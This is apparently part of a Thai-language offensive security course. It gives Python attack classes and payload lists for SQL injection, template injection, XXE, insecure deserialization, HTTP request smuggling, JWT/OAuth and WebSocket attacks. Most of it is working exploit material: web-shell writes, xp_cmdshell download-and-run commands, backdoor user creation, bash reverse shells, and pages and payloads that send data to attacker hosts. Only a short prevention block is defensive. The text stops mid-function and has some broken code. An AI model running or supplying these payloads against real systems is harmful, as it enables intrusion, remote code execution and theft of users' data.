# Part 47: Advanced Web Application Attacks (Steps 461-470)

## ภาพรวม
ส่วนนี้ครอบคลุมเทคนิคการโจมตี web application ขั้นสูง ตั้งแต่ SQL Injection ขั้นสูงไปจนถึง SSTI, Deserialization, XXE และ WebSocket attacks

---

## Step 461: Advanced SQL Injection Techniques

### แนวคิด
SQL Injection ขั้นสูงครอบคลุม Out-of-Band, Time-based Blind, Error-based, และ stacked queries

```python
import requests
import time
import string
import threading
from typing import Optional

class AdvancedSQLInjector:
    """
    Advanced SQL Injection techniques
    """
    
    def __init__(self, url: str, param: str, cookies: dict = None):
        self.url = url
        self.param = param
        self.cookies = cookies or {}
        self.session = requests.Session()
        self.session.cookies.update(cookies or {})
    
    def time_based_blind(self, payload_format: str, check_func, 
                          char_set: str = string.printable) -> str:
        """ดึงข้อมูลด้วย Time-based Blind SQLi"""
        result = ""
        
        for pos in range(1, 100):
            found_char = False
            for char in char_set:
                # Time-based payload
                payload = payload_format.format(
                    pos=pos, char=ord(char)
                )
                
                start = time.time()
                try:
                    self.session.get(
                        self.url,
                        params={self.param: payload},
                        timeout=10
                    )
                except Exception:
                    pass
                elapsed = time.time() - start
                
                if elapsed > 3:  # ถ้าใช้เวลานานกว่า 3 วินาที
                    result += char
                    found_char = True
                    break
            
            if not found_char:
                break
        
        return result
    
    def extract_mysql_version(self) -> Optional[str]:
        """ดึง MySQL version"""
        # Union-based
        payload = "' UNION SELECT version(),2,3-- -"
        
        try:
            resp = self.session.get(
                self.url,
                params={self.param: payload}
            )
            # สกัดใน response
            import re
            version_match = re.search(r'(\d+\.\d+\.\d+)', resp.text)
            if version_match:
                return version_match.group(1)
        except Exception:
            pass
        
        # Time-based fallback
        payload_format = "' AND IF(SUBSTRING(version(),{pos},1)=CHAR({char}),SLEEP(3),0)-- -"
        return self.time_based_blind(payload_format, None)
    
    def dump_database_schema(self) -> list:
        """ดึง schema ผ่าน information_schema"""
        payloads = [
            # MySQL
            "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()-- -",
            # MSSQL
            "' UNION SELECT name,2,3 FROM master.dbo.sysdatabases-- -",
            # PostgreSQL
            "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='public'-- -",
            # Oracle
            "' UNION SELECT table_name,2 FROM all_tables-- -",
        ]
        
        tables = []
        for payload in payloads:
            try:
                resp = self.session.get(
                    self.url,
                    params={self.param: payload}
                )
                # Parse tables from response
                import re
                # ปรับแต่ง pattern ตาม HTML structure
                tables.extend(re.findall(r'<td>(\w+)</td>', resp.text))
            except Exception:
                pass
        
        return list(set(tables))
    
    def out_of_band_exfil(self, query: str, collaborator: str) -> str:
        """ดึงข้อมูลผ่าน OOB (DNS/HTTP)"""
        # MySQL - load_file หรือ UNC path
        mysql_oob = f"' UNION SELECT load_file(CONCAT('\\\\\\\\', ({query}), '.{collaborator}\\\\a'))-- -"
        
        # MSSQL - xp_dirtree
        mssql_oob = f"'; DECLARE @p VARCHAR(1024); SET @p=({query}); EXEC master..xp_dirtree '\\\\' + @p + '.{collaborator}\\\\a'-- -"
        
        # PostgreSQL - COPY TO
        pg_oob = f"'; COPY (SELECT ({query})) TO PROGRAM 'curl {collaborator}?data=' || ({query})-- -"
        
        return {
            "mysql": mysql_oob,
            "mssql": mssql_oob,
            "postgresql": pg_oob
        }
    
    def second_order_sqli(self, store_endpoint: str, trigger_endpoint: str,
                           store_param: str) -> dict:
        """Second-order SQL Injection"""
        # Store เป็นขั้นแรก (เก็บใน DB)
        malicious_username = "admin'-- -"
        
        store_resp = self.session.post(
            store_endpoint,
            data={store_param: malicious_username, "password": "pass"}
        )
        
        # Trigger ในการแก้ไขข้อมูล (ค query ยิง DB)
        trigger_resp = self.session.post(
            trigger_endpoint,
            data={"current_password": "pass", "new_password": "hacked"}
        )
        
        return {
            "stored": store_resp.status_code,
            "triggered": trigger_resp.status_code,
            "payload": malicious_username
        }


# Advanced SQLi payloads
SQLI_ADVANCED_PAYLOADS = """
# Advanced SQL Injection Payloads

# MySQL - Write to file
' UNION SELECT '<?php system($_GET[cmd]) ?>' INTO OUTFILE '/var/www/html/shell.php'-- -

# MySQL - Read file
' UNION SELECT load_file('/etc/passwd'),2,3-- -

# MSSQL - Execute OS commands
'; EXEC xp_cmdshell('powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"')-- -
'; EXEC master..xp_cmdshell 'net user hacker P@ssw0rd! /add'-- -

# MSSQL - Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -

# PostgreSQL - RCE
'; COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec-- -
'; CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output TEXT); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec-- -

# PostgreSQL - Large Object
'; SELECT lo_import('/etc/passwd'); SELECT loid, pageno FROM pg_largeobject-- -

# Oracle - RCE
' UNION SELECT UTL_HTTP.request('http://attacker/?'||user),2 FROM dual-- -

# WAF Bypass techniques
' /*!UNION*/ /*!SELECT*/ 1,2,3-- -
' UNION%0ASELECT%0A1,2,3-- -  (URL encoded newlines)
1;%00' UNION SELECT version(),2,3-- - (null byte)
"""

if __name__ == "__main__":
    injector = AdvancedSQLInjector("http://target/search", "q")
    print("Injector initialized")
    print(SQLI_ADVANCED_PAYLOADS)
```

---

## Step 462: Server-Side Template Injection (SSTI)

### แนวคิด
SSTI เกิดขึ้นเมื่อ user input ถูกเรนเดอร์บน template engine เช่น Jinja2, Twig, Freemarker สามารถเรียกใช้ RCE

```python
import requests
from typing import Optional

class SSTITester:
    """
    Server-Side Template Injection (SSTI) testing
    """
    
    # Detection payloads per engine
    DETECTION_PAYLOADS = {
        "generic": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "*{7*7}",
            "{{7*'7'}}",
            "{7*7}",
            "[[7*7]]",
        ],
        "jinja2": "{{7*7}}",
        "twig": "{{7*7}}",
        "freemarker": "${7*7}",
        "velocity": "#set($x = 7*7)${x}",
        "smarty": "{$smarty.version}",
        "mako": "${7*7}",
        "pebble": "{{7*7}}",
        "thymeleaf": "*{7*7}",
    }
    
    RCE_PAYLOADS = {
        "jinja2": [
            # Python class traversal
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            # Access os module
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            # Via __import__
            "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
            # Simpler approach
            "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
            # Flask g object
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "twig": [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}",
            "{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            # PHP eval
            "{%set a='id'%}{{a|e('system')}}",
        ],
        "freemarker": [
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        ],
        "velocity": [
            "#set($runtime = $class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null))",
            "#set($process = $runtime.exec(\"id\"))",
        ],
        "smarty": [
            "{php}echo shell_exec('id');{/php}",
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd])?>',$smarty)}",
        ]
    }
    
    def __init__(self, url: str, param: str = None, header: str = None):
        self.url = url
        self.param = param
        self.header = header
        self.session = requests.Session()
    
    def detect_ssti(self) -> dict:
        """ตรวจสอบ SSTI และหา engine"""
        results = {}
        
        for payload in self.DETECTION_PAYLOADS["generic"]:
            try:
                if self.param:
                    resp = self.session.get(
                        self.url, 
                        params={self.param: payload},
                        timeout=10
                    )
                elif self.header:
                    resp = self.session.get(
                        self.url,
                        headers={self.header: payload},
                        timeout=10
                    )
                else:
                    continue
                
                # Check if 49 (7*7) appears in response
                if "49" in resp.text:
                    results[payload] = {
                        "vulnerable": True,
                        "response_snippet": resp.text[:200]
                    }
                    
                    # พยายามระบุ engine
                    if "{{" in payload:
                        results[payload]["possible_engine"] = "Jinja2/Twig/Pebble"
                    elif "${" in payload:
                        results[payload]["possible_engine"] = "Freemarker/Velocity/Mako"
                    elif "<%" in payload:
                        results[payload]["possible_engine"] = "ERB/JSP"
            except Exception:
                pass
        
        return results
    
    def exploit_jinja2(self, command: str) -> Optional[str]:
        """โจมตี Jinja2 SSTI"""
        # ลอง payloads ต่างๆ
        payloads = [
            f"{{{{config.__class__.__init__.__globals__['os'].popen('{command}').read()}}}}",
            f"{{{{''.__class__.__mro__[1].__subclasses__()[396]('{command}',shell=True,stdout=-1).communicate()[0].strip()}}}}",
        ]
        
        for payload in payloads:
            try:
                resp = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )
                # สกัดใน response
                if "uid=" in resp.text or len(resp.text) > 50:
                    return resp.text[:500]
            except Exception:
                pass
        
        return None
    
    def generate_jinja2_reverse_shell(self, attacker_ip: str, port: int) -> str:
        """สร้าง Jinja2 reverse shell payload"""
        cmd = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1'"
        return f"""{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}"""


SSTI_DECISION_TREE = """
# SSTI Detection Decision Tree

# Probe 1: {{ 7*7 }} 
#   -> 49: Likely Jinja2 or Twig
#   -> {{7*7}}: Not evaluated - not vulnerable
#   -> ${7*7}: Different engine

# For Jinja2/Twig differentiation:
# Twig: {{ 7*'7' }} -> 49 (coerces to int)
# Jinja2: {{ 7*'7' }} -> 7777777 (string repetition)

# Jinja2 RCE:
{{''.__class__.__mro__[1].__subclasses__()}}
# Look for subprocess.Popen class index
{{''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate()}}

# Twig RCE (PHP):
{{_self.env.registerUndefinedFilterCallback('exec')}}
{{_self.env.getFilter('id')}}

# Freemarker RCE (Java):
${"freemarker.template.utility.Execute"?new()("id")}

# Tools:
# tplmap - automatic SSTI detection and exploitation
python3 tplmap.py -u 'http://target/?name=*' --os-shell
python3 tplmap.py -u 'http://target/?name=*' -e Jinja2 --os-cmd 'id'
"""

print(SSTI_DECISION_TREE)
```

---

## Step 463: XML External Entity (XXE) Injection

### แนวคิด
XXE ช่วยให้อ่านไฟล์ภายใน server, SSRF, หรือในบางกรณี RCE ผ่านการจัดการ XML parser ที่ไม่แพร์ส secure

```python
import requests
from typing import Optional
import urllib.parse

class XXEExplorer:
    """
    XXE Injection testing
    """
    
    def __init__(self, url: str, headers: dict = None):
        self.url = url
        self.headers = headers or {"Content-Type": "application/xml"}
        self.session = requests.Session()
    
    def basic_file_read(self, filepath: str = "/etc/passwd") -> Optional[str]:
        """Basic XXE อ่านไฟล์"""
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<root><data>&xxe;</data></root>"""
        
        try:
            resp = self.session.post(
                self.url,
                data=payload,
                headers=self.headers,
                timeout=10
            )
            return resp.text
        except Exception as e:
            return str(e)
    
    def ssrf_via_xxe(self, target_url: str) -> Optional[str]:
        """SSRF ผ่าน XXE"""
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{target_url}">
]>
<root><data>&xxe;</data></root>"""
        
        try:
            resp = self.session.post(
                self.url,
                data=payload,
                headers=self.headers,
                timeout=10
            )
            return resp.text
        except Exception as e:
            return str(e)
    
    def blind_oob_xxe(self, collaborator: str, filepath: str = "/etc/hostname") -> str:
        """Blind OOB XXE - exfil ผ่าน DNS/HTTP"""
        # External DTD file ที่ server เรา host
        dtd_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file://{filepath}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{collaborator}/?x=%file;'>">
%eval;
%exfil;"""
        
        # Payload ที่ส่งไปยัง server
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{collaborator}/malicious.dtd">
  %xxe;
]>
<root><data>test</data></root>"""
        
        return {
            "payload": payload,
            "dtd_to_host": dtd_content,
            "note": f"Host malicious.dtd at http://{collaborator}/malicious.dtd"
        }
    
    def xxe_via_svg(self, svg_content: str = None) -> str:
        """XXE ผ่าน SVG upload"""
        return """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""
    
    def xxe_via_docx(self) -> str:
        """XXE ผ่าน .docx/.xlsx (OOXML)"""
        # .docx คือ ZIP ที่มี XML ภายใน
        # แก้ word/document.xml
        return """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:wpc="..." ...>
  <w:body><w:p>&xxe;</w:p></w:body>
</w:document>"""
    
    def dos_via_billion_laughs(self) -> str:
        """XXE DoS (Billion Laughs)"""
        return """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""


XXE_PREVENTION = """
# XXE Prevention

# Python defusedxml
import defusedxml.ElementTree as ET
tree = ET.parse(xml_file)  # Prevents XXE by default

# Java - Disable external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

# PHP - LibXML flags
libxml_disable_entity_loader(true);
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

# .NET
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
"""

print(XXE_PREVENTION)
```

---

## Step 464: Insecure Deserialization

### แนวคิด
การ deserialize ข้อมูลที่ไม่ trusted สามารถนำไปสู่ RCE ในภาษา Java, PHP, Python, Ruby

```python
import pickle
import os
import base64
import hmac
import hashlib

class DeserializationAttacker:
    """
    Insecure Deserialization attack demonstrations
    """
    
    def python_pickle_rce(self, command: str) -> bytes:
        """Python Pickle RCE payload"""
        class Exploit:
            def __reduce__(self):
                return (os.system, (command,))
        
        payload = pickle.dumps(Exploit())
        return payload
    
    def python_pickle_reverse_shell(self, attacker_ip: str, port: int) -> str:
        """Pickle reverse shell เป็น base64"""
        class ReverseShell:
            def __reduce__(self):
                cmd = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1'"
                return (os.system, (cmd,))
        
        payload = pickle.dumps(ReverseShell())
        return base64.b64encode(payload).decode()
    
    def php_unserialize_exploit(self) -> str:
        """PHP unserialize magic methods"""
        return """
# PHP Deserialization via magic methods
# __wakeup(), __destruct(), __toString() ถูกเรียกใช้อัตโนมัติ

# PHP Gadget chain example
class Logger {
  public $logFile;
  public function __destruct() {
    file_put_contents($this->logFile, 'Log closed');
  }
}

# Craft malicious object
$obj = new Logger();
$obj->logFile = '/var/www/html/shell.php';
// Object's logFile content written on destruction

# ysoserial - Java deserialization payloads
java -jar ysoserial.jar CommonsCollections5 'id' | base64
java -jar ysoserial.jar Spring1 'curl http://attacker/shell | bash'

# PHP serialized format
# O:6:"Logger":1:{s:7:"logFile";s:27:"/var/www/html/hacked.php";}
"""
    
    def craft_java_ysoserial(self, gadget_chain: str, command: str) -> str:
        """Java deserialization ด้วย ysoserial"""
        return f"""
# ysoserial payloads
java -jar ysoserial.jar {gadget_chain} '{command}' | base64 -w 0

# Common gadget chains:
# CommonsCollections1-7  - Apache Commons Collections
# Spring1, Spring2       - Spring Framework  
# Groovy1               - Groovy
# JRMPClient            - Java RMI deserialization
# Myfaces1, Myfaces2    - Apache MyFaces

# ส่งผ่าน HTTP
curl -X POST http://target/endpoint \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @payload.bin

# หรือทางผ่าน cookie (Base64)
payload=$(java -jar ysoserial.jar {gadget_chain} '{command}' | base64 -w 0)
curl http://target/ --cookie "user=$payload"
"""
    
    def ruby_marshal_rce(self, command: str) -> str:
        """Ruby Marshal deserialization"""
        return f"""
# Ruby Marshal RCE
# Marshal.load() ของ untrusted data

require 'base64'
# Craft malicious object
code = 'require \"open3\"; Open3.capture2(\"{command}\")'
eval code

# Universal Deserializer Tool
https://github.com/pwntester/ysoserial
"""


# Deserialization detection
DESERIAL_DETECTION = """
# Detecting Insecure Deserialization

# 1. Java serialized objects (magic bytes)
# Hex: AC ED 00 05
# Base64: rO0AB
xxd payload.bin | head  # Check for AC ED
echo 'rO0ABXNy...' | base64 -d | xxd | head

# 2. PHP serialized data
# Format: O:4:"User":1:{s:4:"name";s:5:"admin";}
grep -r 'unserialize(' /var/www/  # Find vulnerable code

# 3. Python pickle (binary)
# Starts with specific opcodes

# 4. Testing endpoints
# Check Burp Suite for serialized data in:
# - Cookies (Base64 encoded)
# - HTTP parameters
# - Hidden fields
# - API responses

# Tools:
# - ysoserial: Java deserialization payloads
# - PHPGGC: PHP gadget chains
# - Pickle Inspector: Python pickle analysis
# - Burp Extension: Java Deserialization Scanner
"""

if __name__ == "__main__":
    attacker = DeserializationAttacker()
    payload = attacker.python_pickle_rce("id")
    print(f"Pickle payload: {base64.b64encode(payload).decode()[:50]}...")
    print(DESERI AL_DETECTION)
```

---

## Step 465: HTTP Request Smuggling

### แนวคิด
HTTP Request Smuggling เกิดจากความไม่สอดคล้องกันในการตีความใช้ Content-Length และ Transfer-Encoding ระหว่าง frontend proxy และ backend

```python
import socket
import ssl
from typing import Optional

class HTTPRequestSmuggler:
    """
    HTTP Request Smuggling testing
    """
    
    def __init__(self, host: str, port: int = 80, use_ssl: bool = False):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
    
    def send_raw_request(self, request: bytes) -> str:
        """Send raw HTTP request"""
        try:
            if self.use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = ssl.wrap_socket(
                    socket.create_connection((self.host, self.port)),
                    ssl_version=ssl.PROTOCOL_TLS
                )
            else:
                conn = socket.create_connection((self.host, self.port))
            
            conn.send(request)
            response = b""
            conn.settimeout(5)
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass
            
            return response.decode(errors='replace')
        except Exception as e:
            return f"Error: {e}"
    
    def cl_te_smuggle(self, path: str, smuggled_path: str = "/admin") -> str:
        """CL.TE (Content-Length - Transfer-Encoding)"""
        # Frontend ใช้ Content-Length, Backend ใช้ Transfer-Encoding
        payload = b"X" * 13 + b"\r\nGET " + smuggled_path.encode() + b" HTTP/1.1\r\nFoo: "
        
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(payload) + 4}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{len(payload):x}\r\n"
        ).encode() + payload + b"\r\n0\r\n\r\n"
        
        return self.send_raw_request(request)
    
    def te_cl_smuggle(self, path: str) -> str:
        """TE.CL (Transfer-Encoding - Content-Length)"""
        # Frontend ใช้ Transfer-Encoding, Backend ใช้ Content-Length
        smuggled = b"GET /admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n\r\n"
        
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{len(smuggled):x}\r\n"
        ).encode() + smuggled + b"0\r\n\r\n"
        
        return self.send_raw_request(request)
    
    def detect_via_timing(self, path: str = "/") -> dict:
        """Detect smuggling ผ่าน timing attack"""
        # CL.TE timing
        import time
        
        # Incomplete chunked body - ถ้า backend ใช้ TE จะรอ
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: 4\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
        ).encode()
        
        start = time.time()
        self.send_raw_request(request)
        elapsed = time.time() - start
        
        return {
            "timing": elapsed,
            "possible_cl_te": elapsed > 5,
            "note": "If response is delayed, CL.TE smuggling may be possible"
        }


SMUGGLING_TOOLS = """
# HTTP Request Smuggling Tools

# 1. smuggler.py
python3 smuggler.py -u https://target.com/
python3 smuggler.py -u https://target.com/ -v -t 10

# 2. HTTP Request Smuggler (Burp Extension)
# Right-click request > Extensions > HTTP Request Smuggler
# Scan all techniques (CL.TE, TE.CL, TE.TE)

# 3. Manual testing
# Use Turbo Intruder or Repeater with Keep-Alive

# 4. h2smuggler - HTTP/2 request smuggling
http2smuggler scan https://target.com/

# Attack scenarios:
# 1. Bypass front-end security controls
# 2. Capture other users' requests
# 3. Web cache poisoning via smuggling
# 4. Reflected XSS to stored XSS
# 5. Access internal virtual hosts
"""

print(SMUGGLING_TOOLS)
```

---

## Step 466: OAuth 2.0 and JWT Attack Techniques

### แนวคิด
การเจาะช่องโหว่ใน OAuth flows และ JWT tokens

```python
import jwt
import json
import base64
import requests
import hmac
import hashlib
from typing import Optional

class OAuthJWTAttacker:
    """
    OAuth 2.0 and JWT attack techniques
    """
    
    def test_jwt_none_algorithm(self, token: str) -> Optional[str]:
        """Test 'none' algorithm attack"""
        parts = token.split(".")
        if len(parts) != 3:
            return None
        
        # Decode header
        header = json.loads(base64.b64decode(parts[0] + "==").decode())
        header["alg"] = "none"
        
        # Re-encode
        new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip("=")
        # Remove signature
        return f"{new_header}.{parts[1]}."
    
    def test_jwt_alg_confusion(self, token: str, public_key: str) -> Optional[str]:
        """RS256 to HS256 algorithm confusion"""
        parts = token.split(".")
        if len(parts) != 3:
            return None
        
        # Decode header
        header = json.loads(base64.b64decode(parts[0] + "==").decode())
        payload = json.loads(base64.b64decode(parts[1] + "==").decode())
        
        # เปลี่ยนเป็น HS256
        header["alg"] = "HS256"
        payload["admin"] = True  # Escalate
        
        # Sign ด้วย public key เป็น secret
        try:
            new_token = jwt.encode(
                payload, 
                public_key,  # Using public key as HMAC secret
                algorithm="HS256",
                headers=header
            )
            return new_token
        except Exception as e:
            return str(e)
    
    def test_jwt_jwk_injection(self, token: str) -> str:
        """JWK Set injection in header"""
        parts = token.split(".")
        if len(parts) != 3:
            return ""
        
        payload = json.loads(base64.b64decode(parts[1] + "==").decode())
        payload["admin"] = True
        
        # สร้าง RSA key pair ใหม่
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend
        
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        # Embed JWK in header
        jwk_header = {
            "alg": "RS256",
            "jwk": {
                "kty": "RSA",
                "n": "our_public_modulus",
                "e": "AQAB"
            }
        }
        
        return f"Craft token with embedded JWK pointing to attacker-controlled key"
    
    def test_oauth_state_parameter(self, auth_url: str) -> dict:
        """OAuth state parameter CSRF test"""
        # Missing state = CSRF vulnerable
        resp = requests.get(auth_url, allow_redirects=False)
        
        location = resp.headers.get("Location", "")
        
        return {
            "has_state": "state=" in location,
            "location": location,
            "vulnerable_to_csrf": "state=" not in location
        }
    
    def test_oauth_redirect_uri(self, auth_endpoint: str, client_id: str,
                                  redirect_uri: str) -> list:
        """OAuth redirect_uri validation test"""
        bypass_uris = [
            redirect_uri + ".attacker.com",
            redirect_uri.replace("https://", "https://attacker.com@"),
            "https://attacker.com",
            redirect_uri + "/../../attacker.com",
            redirect_uri + "?x=attacker.com",
        ]
        
        results = []
        for uri in bypass_uris:
            try:
                resp = requests.get(
                    auth_endpoint,
                    params={
                        "response_type": "code",
                        "client_id": client_id,
                        "redirect_uri": uri
                    },
                    allow_redirects=False,
                    timeout=5
                )
                results.append({
                    "uri": uri,
                    "status": resp.status_code,
                    "accepted": resp.status_code in [301, 302]
                })
            except Exception:
                pass
        
        return results
    
    def crack_jwt_secret(self, token: str, wordlist: str = None) -> Optional[str]:
        """Brute force JWT secret (HS256)"""
        if not wordlist:
            common_secrets = [
                "secret", "password", "123456", "key",
                "supersecret", "your-256-bit-secret", "",
                "jwt-secret", "development"
            ]
        else:
            with open(wordlist) as f:
                common_secrets = [line.strip() for line in f]
        
        for secret in common_secrets:
            try:
                jwt.decode(token, secret, algorithms=["HS256"])
                return secret
            except jwt.InvalidSignatureError:
                continue
            except Exception:
                continue
        
        return None


JWT_ATTACK_COMMANDS = """
# JWT Attack Commands

# 1. Decode JWT
cat token.txt | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
cat token.txt | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# 2. jwt_tool - automated JWT testing
python3 jwt_tool.py TOKEN -t https://target.com
python3 jwt_tool.py TOKEN -X a  # Test all attacks
python3 jwt_tool.py TOKEN -X n  # None algorithm
python3 jwt_tool.py TOKEN -X s  # HS256 brute force

# 3. hashcat JWT
hashcat -m 16500 token.txt rockyou.txt

# 4. john
john --wordlist=rockyou.txt --format=HMAC-SHA256 token.txt

# 5. jwt_cracker
git clone https://github.com/lmammino/jwt-cracker
npm install && node index.js TOKEN CHARS LENGTH

# 6. Modify payload (after finding/guessing secret)
python3 -c "
import jwt
payload = {'user': 'admin', 'admin': True}
token = jwt.encode(payload, 'secret', algorithm='HS256')
print(token)
"
"""

print(JWT_ATTACK_COMMANDS)
```

---

## Step 467: WebSocket Security Testing

### แนวคด

WebSockets มีช่องโหว่เฉพาะตัว เช่น injection, authentication bypass, และ cross-site WebSocket hijacking

```python
import websocket
import json
import threading
import time
from typing import Optional, Callable

class WebSocketTester:
    """
    WebSocket Security Testing
    """
    
    def __init__(self, ws_url: str, headers: dict = None, cookies: str = None):
        self.ws_url = ws_url
        self.headers = headers or {}
        self.cookies = cookies
        self.received_messages = []
    
    def connect_and_test(self, test_message: str) -> dict:
        """Connect และทดสอบ"""
        results = {
            "connected": False,
            "messages": [],
            "error": None
        }
        
        def on_message(ws, message):
            results["messages"].append(message)
        
        def on_error(ws, error):
            results["error"] = str(error)
        
        def on_open(ws):
            results["connected"] = True
            ws.send(test_message)
        
        ws = websocket.WebSocketApp(
            self.ws_url,
            header=self.headers,
            cookie=self.cookies,
            on_message=on_message,
            on_error=on_error,
            on_open=on_open
        )
        
        # Run for limited time
        timer = threading.Timer(5.0, ws.close)
        timer.start()
        ws.run_forever()
        
        return results
    
    def test_injection(self) -> list:
        """ทดสอบ injection ผ่าน WebSocket"""
        injection_payloads = [
            # SQLi
            '{"username": "admin\' OR 1=1-- -"}',
            # XSS
            '{"message": "<script>alert(1)</script>"}',
            # Command injection
            '{"input": "test; id"}',
            # Path traversal
            '{"file": "../../../etc/passwd"}',
            # NoSQL injection
            '{"username": {"$gt": ""}}',
        ]
        
        results = []
        for payload in injection_payloads:
            result = self.connect_and_test(payload)
            results.append({
                "payload": payload,
                "response": result["messages"]
            })
        
        return results
    
    def cross_site_websocket_hijacking(self, target_ws: str) -> str:
        """Cross-Site WebSocket Hijacking (CSWSH)"""
        # ถ้า WebSocket เชื่อมต่อเพียง session cookie
        # attacker site สามารถเชื่อมต่อแทนผู้ใช้ได้
        return f"""
<!-- CSWSH Exploit Page -->
<html>
<body>
  <script>
    // เชื่อมต่อ WebSocket ด้วย session cookie ของ victim
    var ws = new WebSocket('{target_ws}');
    
    ws.onopen = function() {{
      // ส่งข้อความที่ต้องการข้อมูล
      ws.send(JSON.stringify({{"action": "get_data", "type": "private"}}));
    }};
    
    ws.onmessage = function(e) {{
      // ส่งดึงข้อมูลไปยัง attacker server
      fetch('https://attacker.com/collect?data=' + encodeURIComponent(e.data));
    }};
  </script>
</body>
</html>
"""
    
    def test_authentication_bypass(self) -> list:
        """ทดสอบการ bypass auth บน WebSocket"""
        results = []
        
        # Test 1: เชื่อมต่อโดยไม่มี auth
        result = self.connect_and_test('{"action": "get_private"}')
        if result["connected"] and result["messages"]:
            results.append({
                "test": "Unauthenticated access",
                "result": "VULNERABLE",
                "data": result["messages"]
            })
        
        # Test 2: Empty token
        headers_no_auth = {"Authorization": ""}
